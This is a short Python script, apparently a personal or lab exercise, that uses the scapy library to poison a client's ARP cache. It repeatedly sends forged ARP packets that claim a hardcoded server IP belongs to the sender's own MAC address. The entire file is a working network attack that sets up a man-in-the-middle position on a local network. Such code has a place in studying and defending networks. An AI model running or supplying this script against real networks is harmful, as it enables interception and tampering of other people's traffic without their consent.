from scapy.all import *
from scapy.layers.inet import TCP, IP, ICMP, UDP
from scapy.layers.l2 import *
import pcap
import time

local_ip = '10.0.0.14'
client_ip = "10.0.0.12"
server_ip = "10.0.0.138"


def arp_poison():
    """sends ARP who-has massages every 5 seconds to the target,
     poisoning the ARP cache with (myMac, servers ip)"""
    client_mac = getmacbyip(client_ip)
    print("sending who-has packets to target")
    pkt = Ether(dst=client_mac) / ARP(op="who-has", psrc=server_ip, pdst=client_ip)

    while True:
        sendp(pkt)
        time.sleep(5)


def main():
    # target_ip = input(enter tragets ip)
    # server_ip = input(enter servers ip)
    arp_poison()


if __name__ == "__main__":
    main()
